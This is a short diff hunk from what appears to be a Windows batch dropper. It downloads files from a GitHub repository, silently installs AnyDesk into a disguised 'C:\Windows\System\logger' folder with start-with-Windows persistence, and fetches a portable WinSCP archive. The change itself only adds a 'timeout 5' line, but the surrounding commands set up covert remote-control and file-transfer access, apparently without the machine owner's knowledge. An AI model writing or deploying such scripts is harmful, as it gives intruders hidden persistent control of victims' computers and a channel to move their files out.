@@ -9,6 +9,7 @@ powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR
 mkdir C:\Windows\System\logger\Anydesk
 powershell Invoke-WebRequest https://download.anydesk.com/AnyDesk.exe -OutFile C:\Windows\System\logger\Anydesk\installer.exe
 C:\Windows\System\logger\AnyDesk\installer.exe --install "C:\Windows\System\logger\AnyDesk" --start-with-win --silent --update-manually
+timeout 5
 :scp
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile C:\Windows\System\logger\scp.zip
 powershell Expand-Archive C:\Windows\System\logger\scp.zip -DestinationPath C:\Windows\System\logger\
